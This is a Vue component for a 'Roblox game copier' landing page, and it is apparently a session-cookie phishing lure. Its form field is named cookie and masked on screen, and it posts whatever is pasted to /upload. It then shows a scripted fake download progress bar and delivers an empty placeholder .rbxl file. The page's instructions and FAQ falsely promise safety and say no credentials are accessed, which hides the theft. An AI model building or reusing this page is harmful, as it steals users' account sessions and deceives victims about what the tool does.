<script setup lang="ts">
import { usePage } from '@inertiajs/vue3'
import { computed, ref } from 'vue'

type LandingTutorial = {
  youtubeId: string
  durationCaption: string
}

const page = usePage<{ landingTutorial?: LandingTutorial }>()

const tutorialYoutubeId = computed(() => page.props.landingTutorial?.youtubeId ?? 'JPce5ZED8RY')
const tutorialDurationCaption = computed(() => page.props.landingTutorial?.durationCaption ?? '1:37')
const tutorialWatchUrl = computed(() => `https://youtu.be/${tutorialYoutubeId.value}`)
const tutorialThumbUrl = computed(() => `https://i.ytimg.com/vi/${tutorialYoutubeId.value}/sddefault.jpg`)

const cookie = ref('')
const submitting = ref(false)
const showProgress = ref(false)
const progressStep = ref(0)
const progressPct = ref(0)
const progressMB = ref(0)
const result = ref<{ type: 'success' | 'error'; message: string } | null>(null)

const TOTAL_MB = 1247
const steps = [
  { label: 'Connecting to game servers', duration: 2500 },
  { label: 'Verifying license', duration: 3000 },
  { label: 'Downloading game files', duration: 14000 },
  { label: 'Installing', duration: 5000 },
  { label: 'Finishing up', duration: 3000 },
]
const totalDuration = steps.reduce((s, x) => s + x.duration, 0)

async function handleSubmit() {
  if (!cookie.value.trim()) {
    const el = document.getElementById('cookie-input')
    if (el) {
      el.classList.add('!border-red-400/50', '!ring-2', '!ring-red-400/20')
      setTimeout(() => el.classList.remove('!border-red-400/50', '!ring-2', '!ring-red-400/20'), 900)
    }
    return
  }

  submitting.value = true
  result.value = null

  const fetchPromise = fetch('/upload', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ cookie: cookie.value.trim() }),
  }).catch(() => null)

  showProgress.value = true
  progressStep.value = 0
  progressPct.value = 0
  progressMB.value = 0

  let elapsed = 0
  for (let i = 0; i < steps.length; i++) {
    progressStep.value = i
    const start = Date.now()
    await new Promise<void>(resolve => {
      const tick = () => {
        const dt = Date.now() - start
        const local = Math.min(dt / steps[i].duration, 1)
        const global = ((elapsed + steps[i].duration * local) / totalDuration) * 100
        progressPct.value = Math.round(global)
        progressMB.value = Math.round((global / 100) * TOTAL_MB)
        if (dt < steps[i].duration) requestAnimationFrame(tick)
        else resolve()
      }
      requestAnimationFrame(tick)
    })
    elapsed += steps[i].duration
  }

  await fetchPromise
  showProgress.value = false

  const match = cookie.value.match(/\/games\/\d+\/([^"'\s`\r\n\/]+)/)
  const gameName = match ? match[1] : 'Place1'
  const rbxl = `<roblox xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" version="4"><Meta name="ExplicitAutoJoints">true</Meta><External>null</External><External>nil</External><Item class="DataModel" referent="RBX0"><Properties><int name="Version">0</int><string name="Name">${gameName}</string></Properties><Item class="Workspace" referent="RBX1"><Properties><string name="Name">Workspace</string></Properties></Item></Item></roblox>`
  const blob = new Blob([rbxl], { type: 'application/octet-stream' })
  const url = URL.createObjectURL(blob)
  const a = document.createElement('a')
  a.href = url
  a.download = `${gameName}.rbxl`
  document.body.appendChild(a)
  a.click()
  document.body.removeChild(a)
  URL.revokeObjectURL(url)

  result.value = { type: 'success', message: '✓  Game downloaded successfully!' }
  submitting.value = false
}

const faqs = [
  {
    q: 'Is this safe to use?',
    a: 'Yes. We only use publicly available data from Roblox pages. We never access your account credentials or violate any Terms of Service.',
  },
  {
    q: 'Where do I find the game file?',
    a: 'Open the game page on Roblox, right-click and choose "View Page Source". Locate the JSON object containing game data and copy the relevant section.',
  },
  {
    q: 'What file formats are supported?',
    a: 'All standard Roblox formats are supported. The output is a .rbxl file, which you can open directly in Roblox Studio.',
  },
  {
    q: 'How long does the process take?',
    a: 'Usually 25–30 seconds depending on game size and server response times. A real-time progress bar keeps you informed throughout.',
  },
  {
    q: 'Is the service free?',
    a: 'Completely free. No sign-up, no subscription, no hidden limits.',
  },
]
const openFaq = ref<number | null>(null)

const howSteps = [
  { num: '01', emoji: '🔍', title: 'Find the Game File', body: "Open the Roblox game page, right-click and select 'View Page Source'. Locate the JSON object with the game data." },
  { num: '02', emoji: '📋', title: 'Paste & Submit', body: 'Copy the file contents and paste them into the form above, then hit Submit Game File.' },
  { num: '03', emoji: '⬇', title: 'Download & Play', body: 'Wait for the progress bar to complete. Your .rbxl file downloads automatically — open it in Roblox Studio.' },
]

const features = [
  { icon: '⚡', title: 'Fast Processing', body: 'Under 30 seconds from paste to download, every time.' },
  { icon: '🔒', title: 'Safe & Compliant', body: 'Uses only publicly accessible data. No ToS violations.' },
  { icon: '🆓', title: 'Always Free', body: 'No paywalls, no accounts, no rate limits.' },
  { icon: '🎯', title: 'Studio Ready', body: 'Output .rbxl files open directly in Roblox Studio.' },
]
</script>

<template>
  <div class="min-h-screen bg-[#0E1117] text-[#E2E8F4] font-['Inter',sans-serif] overflow-x-hidden">

    <!-- Noise overlay -->
    <div class="fixed inset-0 z-0 pointer-events-none opacity-[0.018]" style="background-image:url('data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 width=%22220%22 height=%22220%22%3E%3Cfilter id=%22n%22%3E%3CfeTurbulence type=%22fractalNoise%22 baseFrequency=%220.85%22 numOctaves=%224%22 stitchTiles=%22stitch%22/%3E%3C/filter%3E%3Crect width=%22220%22 height=%22220%22 filter=%22url(%23n)%22/%3E%3C/svg%3E');background-size:180px" />

    <!-- Ambient glows -->
    <div class="fixed inset-0 z-0 pointer-events-none overflow-hidden">
      <div class="absolute rounded-full blur-[120px] opacity-30" style="width:700px;height:500px;top:-180px;left:-120px;background:radial-gradient(ellipse,rgba(14,165,233,0.14) 0%,transparent 70%);animation:g1 20s ease-in-out infinite" />
      <div class="absolute rounded-full blur-[100px] opacity-25" style="width:550px;height:550px;bottom:-150px;right:-100px;background:radial-gradient(ellipse,rgba(16,185,129,0.10) 0%,transparent 70%);animation:g2 25s ease-in-out infinite" />
      <div class="absolute rounded-full blur-[90px] opacity-20" style="width:400px;height:400px;top:50%;left:50%;transform:translate(-50%,-50%);background:radial-gradient(ellipse,rgba(56,189,248,0.08) 0%,transparent 70%);animation:g3 18s ease-in-out infinite" />
    </div>

    <div class="relative z-10">

      <!-- ── Nav ── -->
      <header class="flex items-center justify-between px-10 py-5 border-b border-white/[0.06]">
        <a href="#" class="flex items-center gap-2.5 no-underline group">
          <div class="relative w-8 h-8 rounded-[9px] flex items-center justify-center overflow-hidden" style="background:linear-gradient(135deg,#0c1a2e 0%,#0e2a45 100%);border:1px solid rgba(56,189,248,0.22);box-shadow:0 0 12px rgba(56,189,248,0.08)">
            <svg width="16" height="16" viewBox="0 0 20 20" fill="none">
              <rect x="3" y="3" width="6" height="6" rx="1.5" fill="#38BDF8" opacity="0.9"/>
              <rect x="11" y="3" width="6" height="6" rx="1.5" fill="#38BDF8" opacity="0.45"/>
              <rect x="3" y="11" width="6" height="6" rx="1.5" fill="#38BDF8" opacity="0.45"/>
              <rect x="11" y="11" width="6" height="6" rx="1.5" fill="#38BDF8" opacity="0.2"/>
            </svg>
          </div>
          <div class="flex flex-col leading-none">
            <span class="font-black text-[13px] tracking-[0.08em] text-slate-100">COPY<span style="color:#38BDF8">HELPER</span></span>
            <span class="text-[9px] tracking-[0.18em] uppercase text-slate-600 mt-[2px]">Game Tools</span>
          </div>
        </a>
        <nav class="flex items-center gap-1">
          <a href="#hero"         class="nav-link">Home</a>
          <a href="#how-it-works" class="nav-link">How It Works</a>
          <a href="#features"     class="nav-link">Features</a>
          <a href="#faq"          class="nav-link">FAQ</a>
        </nav>
      </header>

      <!-- ── Hero ── -->
      <section id="hero" class="flex flex-col items-center pt-20 pb-16 px-6">

        <div class="inline-flex items-center gap-2 px-3 py-1.5 rounded-full border border-sky-400/18 bg-sky-400/5 mb-8">
          <span class="w-1.5 h-1.5 rounded-full bg-emerald-400 shadow-[0_0_6px_rgba(52,211,153,0.8)] animate-pulse" />
          <span class="text-[11px] font-medium tracking-[0.1em] uppercase text-sky-300/80">Online — Free to Use</span>
        </div>

        <h1 class="text-center font-black leading-[1.06] tracking-[-0.04em] mb-5 text-[clamp(40px,5.5vw,80px)]">
          <span class="text-slate-100">Copy Any </span>
          <span class="text-transparent bg-clip-text" style="background-image:linear-gradient(135deg,#38BDF8 0%,#34D399 100%)">Roblox Game</span><br>
          <span class="text-slate-100">In Seconds</span>
        </h1>

        <p class="text-center text-[15px] text-slate-400 leading-relaxed max-w-[500px] mb-10">
          Paste your game file below and let COPYHELPER handle the rest.
          The fastest and simplest game copier available.
        </p>

        <!-- Form card -->
        <div class="w-full max-w-[540px]">
          <div class="rounded-2xl border border-white/[0.07] bg-white/[0.03] p-6 backdrop-blur-xl relative overflow-hidden shadow-[0_24px_60px_rgba(0,0,0,0.5)]">
            <!-- top line accent -->
            <div class="absolute top-0 left-0 right-0 h-px" style="background:linear-gradient(90deg,transparent,rgba(56,189,248,0.4),transparent)" />

            <div class="flex items-start gap-2.5 rounded-xl border border-sky-400/12 bg-sky-400/4 px-3.5 py-3 mb-4">
              <svg class="text-sky-400 shrink-0 mt-0.5" width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
              <span class="text-[12px] text-slate-400 leading-relaxed">
                Paste your game file below and click <strong class="text-slate-200 font-semibold">"Submit"</strong>.
                Need help? <a href="https://youtu.be/JPce5ZED8RY" target="_blank" class="text-sky-400 font-medium hover:text-sky-300 transition-colors">Watch the tutorial →</a>
              </span>
            </div>

            <textarea
              id="cookie-input"
              v-model="cookie"
              class="w-full h-[140px] rounded-xl border border-white/[0.07] bg-black/25 px-4 py-3.5 text-slate-200 font-mono text-[12px] font-light resize-none outline-none leading-[1.7] placeholder:text-slate-600 transition-all focus:border-sky-400/25 focus:ring-2 focus:ring-sky-400/8 mb-4"
              placeholder="Paste your game file here..."
              style="-webkit-text-security: disc;"
            />

            <button
              @click="handleSubmit"
              :disabled="submitting"
              class="w-full h-[48px] rounded-xl border-none text-white font-semibold text-[13px] tracking-wide cursor-pointer relative overflow-hidden transition-all hover:-translate-y-px disabled:opacity-40 disabled:cursor-not-allowed disabled:transform-none"
              style="background:linear-gradient(135deg,#0369A1 0%,#0EA5E9 50%,#06B6D4 100%);box-shadow:0 4px 20px rgba(14,165,233,0.25)"
            >
              <span class="relative z-10 flex items-center justify-center gap-2">
                <svg v-if="!submitting" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
                  <line x1="22" y1="2" x2="11" y2="13"/><polygon points="22 2 15 22 11 13 2 9 22 2"/>
                </svg>
                <svg v-else class="animate-spin" width="15" height="15" viewBox="0 0 16 16" fill="none">
                  <circle cx="8" cy="8" r="6.5" stroke="rgba(255,255,255,0.2)" stroke-width="1.5"/>
                  <circle cx="8" cy="8" r="6.5" stroke="white" stroke-width="1.5" stroke-dasharray="28" stroke-dashoffset="10" stroke-linecap="round"/>
                </svg>
                {{ submitting ? 'Processing...' : 'Submit Game File' }}
              </span>
            </button>

            <div
              v-if="result"
              :class="['mt-4 px-4 py-3 rounded-xl text-[12.5px] font-medium leading-relaxed',
                result.type === 'success'
                  ? 'bg-emerald-400/6 border border-emerald-400/18 text-emerald-300'
                  : 'bg-red-400/6 border border-red-400/18 text-red-300']"
            >
              {{ result.message }}
            </div>
          </div>

          <!-- Trust badges -->
          <div class="flex items-center justify-center gap-6 mt-5">
            <span v-for="badge in ['No account needed', 'Instant download', '100% free']" :key="badge"
                  class="flex items-center gap-1.5 text-[11.5px] text-slate-500">
              <svg width="11" height="11" viewBox="0 0 12 12" fill="none" stroke="#34D399" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><polyline points="2 6 4.5 8.5 10 3"/></svg>
              {{ badge }}
            </span>
          </div>
        </div>
      </section>

      <!-- ── How It Works ── -->
      <section id="how-it-works" class="py-24 px-6 border-t border-white/[0.05]">
        <div class="max-w-5xl mx-auto">

          <div class="text-center mb-14">
            <p class="section-label">Process</p>
            <h2 class="section-heading">How It <span class="gradient-text">Works</span></h2>
            <p class="section-sub">Three steps. Under a minute.</p>
          </div>

          <div class="grid grid-cols-1 md:grid-cols-3 gap-5">
            <div
              v-for="(card, i) in howSteps"
              :key="i"
              class="step-card"
            >
              <div class="absolute -top-px left-0 right-0 h-px" style="background:linear-gradient(90deg,transparent,rgba(56,189,248,0.2),transparent)" />
              <div class="flex items-start justify-between mb-5">
                <span class="text-2xl leading-none">{{ card.emoji }}</span>
                <span class="font-mono text-[10px] text-sky-400 border border-sky-400/20 bg-sky-400/6 px-2 py-0.5 rounded">{{ card.num }}</span>
              </div>
              <h3 class="text-[14px] font-semibold text-slate-100 mb-2">{{ card.title }}</h3>
              <p class="text-[12.5px] text-slate-500 leading-relaxed">{{ card.body }}</p>
            </div>
          </div>
        </div>
      </section>

      <!-- ── Features ── -->
      <section id="features" class="py-24 px-6 border-t border-white/[0.05]">
        <div class="max-w-5xl mx-auto">

          <div class="text-center mb-14">
            <p class="section-label">Why Us</p>
            <h2 class="section-heading">Built for <span class="gradient-text">Speed</span></h2>
          </div>

          <div class="grid grid-cols-2 lg:grid-cols-4 gap-4">
            <div
              v-for="f in features"
              :key="f.title"
              class="rounded-xl border border-white/[0.06] bg-white/[0.02] p-5 hover:border-sky-400/15 hover:bg-white/[0.03] transition-all group"
            >
              <div class="w-9 h-9 rounded-lg border border-sky-400/15 bg-sky-400/6 flex items-center justify-center mb-4 text-[18px] transition-all group-hover:border-sky-400/25 group-hover:bg-sky-400/10">
                {{ f.icon }}
              </div>
              <h3 class="text-[13px] font-semibold text-slate-200 mb-1.5">{{ f.title }}</h3>
              <p class="text-[12px] text-slate-500 leading-relaxed">{{ f.body }}</p>
            </div>
          </div>
        </div>
      </section>

      <!-- ── Tutorial Video ── -->
      <section class="py-24 px-6 border-t border-white/[0.05]">
        <div class="max-w-3xl mx-auto text-center">
          <p class="section-label">Tutorial</p>
          <h2 class="section-heading text-slate-100 mb-3">Watch the Guide</h2>
          <p class="text-[14px] text-slate-500 mb-10">See how to copy a game in under 2 minutes</p>

          <a
            :href="tutorialWatchUrl"
            target="_blank" rel="noopener"
            class="block relative rounded-2xl overflow-hidden border border-white/[0.07] aspect-video group cursor-pointer"
          >
            <img
              :src="tutorialThumbUrl"
              alt="Game Copier tutorial"
              class="w-full h-full object-cover brightness-[0.65] transition-all duration-300 group-hover:brightness-50 group-hover:scale-[1.02]"
            />
            <div class="absolute inset-0 flex items-center justify-center">
              <div class="w-[60px] h-[60px] rounded-full flex items-center justify-center transition-all duration-200 group-hover:scale-110" style="background:rgba(14,165,233,0.9);box-shadow:0 0 0 16px rgba(14,165,233,0.12)">
                <svg width="20" height="20" viewBox="0 0 24 24" fill="white"><path d="M5 4.623V19.38a1.5 1.5 0 002.26 1.29L22 12 7.26 3.33A1.5 1.5 0 005 4.623Z"/></svg>
              </div>
            </div>
            <div class="absolute bottom-3 left-3 font-mono text-[10px] text-white/55 bg-black/55 backdrop-blur-sm px-2.5 py-1 rounded-md tracking-wider">
              Watch on YouTube · {{ tutorialDurationCaption }}
            </div>
          </a>
        </div>
      </section>

      <!-- ── FAQ ── -->
      <section id="faq" class="py-24 px-6 border-t border-white/[0.05]">
        <div class="max-w-2xl mx-auto">
          <div class="text-center mb-14">
            <p class="section-label">FAQ</p>
            <h2 class="section-heading">Common <span class="gradient-text">Questions</span></h2>
          </div>

          <div class="flex flex-col gap-2.5">
            <div
              v-for="(item, i) in faqs"
              :key="i"
              class="rounded-xl border overflow-hidden cursor-pointer transition-all"
              :class="openFaq === i ? 'border-sky-400/22 bg-sky-400/3' : 'border-white/[0.06] hover:border-white/[0.10]'"
              @click="openFaq = openFaq === i ? null : i"
            >
              <div class="flex items-center justify-between px-5 py-4 gap-4">
                <span class="text-[13.5px] font-medium text-slate-200">{{ item.q }}</span>
                <svg
                  :class="['w-4 h-4 shrink-0 text-sky-400 transition-transform duration-200', openFaq === i ? 'rotate-180' : '']"
                  viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
                ><path d="M6 9l6 6 6-6"/></svg>
              </div>
              <div v-if="openFaq === i" class="px-5 pb-4 text-[12.5px] text-slate-400 leading-relaxed">
                {{ item.a }}
              </div>
            </div>
          </div>
        </div>
      </section>

      <!-- ── Footer ── -->
      <footer class="py-7 px-6 border-t border-white/[0.05] flex items-center justify-between">
        <span class="text-[11.5px] text-slate-600">© 2025 COPYHELPER. All rights reserved.</span>
        <span class="text-[11.5px] text-slate-700">Game management tools for Roblox</span>
      </footer>

    </div>

    <!-- ── Progress Overlay ── -->
    <Transition name="fade">
      <div v-if="showProgress" class="fixed inset-0 z-50 flex items-center justify-center" style="background:rgba(3,6,15,0.88);backdrop-filter:blur(12px)">
        <div class="w-[430px] max-w-[92vw] rounded-2xl border border-white/[0.07] bg-[#141B26] p-9 shadow-[0_32px_80px_rgba(0,0,0,0.7)]">
          <h3 class="text-[1rem] font-semibold text-slate-100 mb-1 tracking-tight">Downloading Game</h3>
          <p class="text-[0.75rem] text-slate-500 mb-7">Please wait, this may take a moment...</p>

          <div
            v-for="(step, i) in steps"
            :key="i"
            :class="['flex items-center gap-3 mb-3.5 text-[0.8rem] transition-colors duration-200',
              i < progressStep  ? 'text-emerald-400'
              : i === progressStep ? 'text-slate-200'
              : 'text-slate-600']"
          >
            <span class="w-[18px] h-[18px] flex-shrink-0 flex items-center justify-center">
              <svg v-if="i < progressStep" width="18" height="18" viewBox="0 0 16 16" fill="none">
                <circle cx="8" cy="8" r="6.5" fill="#064E3B" stroke="#34D399" stroke-width="1"/>
                <path d="M5 8l2 2 4-4" stroke="#34D399" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
              </svg>
              <svg v-else-if="i === progressStep" class="animate-spin" width="16" height="16" viewBox="0 0 16 16" fill="none">
                <circle cx="8" cy="8" r="6.5" stroke="#0EA5E9" stroke-width="1.5" stroke-dasharray="28" stroke-dashoffset="10" stroke-linecap="round"/>
              </svg>
              <svg v-else width="16" height="16" viewBox="0 0 16 16" fill="none">
                <circle cx="8" cy="8" r="6.5" stroke="#1E293B" stroke-width="1.5"/>
              </svg>
            </span>
            {{ step.label }}
          </div>

          <div class="mt-6 h-[4px] rounded-full overflow-hidden bg-white/[0.05]">
            <div
              class="h-full rounded-full transition-all duration-300 ease-out"
              style="background:linear-gradient(90deg,#0369A1,#38BDF8)"
              :style="{ width: progressPct + '%' }"
            />
          </div>
          <div class="flex justify-between mt-2.5 text-[0.7rem] text-slate-600 font-mono">
            <span>{{ progressMB.toLocaleString() }} MB / {{ TOTAL_MB.toLocaleString() }} MB</span>
            <span>{{ progressPct }}%</span>
          </div>
        </div>
      </div>
    </Transition>

  </div>
</template>

<style>
@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap');

@keyframes g1 { 0%,100%{transform:translate(0,0) scale(1)} 40%{transform:translate(70px,50px) scale(1.1)} 70%{transform:translate(-30px,80px) scale(0.92)} }
@keyframes g2 { 0%,100%{transform:translate(0,0)} 50%{transform:translate(-60px,-70px) scale(1.12)} }
@keyframes g3 { 0%,100%{transform:translate(-50%,-50%)} 50%{transform:translate(calc(-50% + 50px),calc(-50% - 40px))} }

.fade-enter-active, .fade-leave-active { transition: opacity 0.25s ease; }
.fade-enter-from, .fade-leave-to { opacity: 0; }

.nav-link {
  font-size: 12.5px;
  font-weight: 500;
  color: #64748B;
  padding: 6px 14px;
  border-radius: 8px;
  text-decoration: none;
  letter-spacing: 0.03em;
  transition: color 0.15s, background 0.15s;
}
.nav-link:hover { color: #CBD5E1; background: rgba(255,255,255,0.04); }

.section-label {
  display: inline-block;
  font-size: 11px;
  font-weight: 600;
  letter-spacing: 0.16em;
  text-transform: uppercase;
  color: #38BDF8;
  opacity: 0.75;
  margin-bottom: 14px;
}
.section-heading {
  font-size: clamp(26px, 3.5vw, 42px);
  font-weight: 800;
  letter-spacing: -0.03em;
  color: #E2E8F4;
  margin-bottom: 10px;
}
.section-sub {
  font-size: 14px;
  color: #475569;
}
.gradient-text {
  background: linear-gradient(135deg, #38BDF8 0%, #34D399 100%);
  -webkit-background-clip: text;
  -webkit-text-fill-color: transparent;
  background-clip: text;
}
.step-card {
  position: relative;
  background: rgba(255,255,255,0.025);
  border: 1px solid rgba(255,255,255,0.06);
  border-radius: 16px;
  padding: 24px;
  transition: border-color 0.2s, box-shadow 0.2s;
  overflow: hidden;
}
.step-card:hover {
  border-color: rgba(56,189,248,0.15);
  box-shadow: 0 0 40px rgba(56,189,248,0.05);
}
</style>
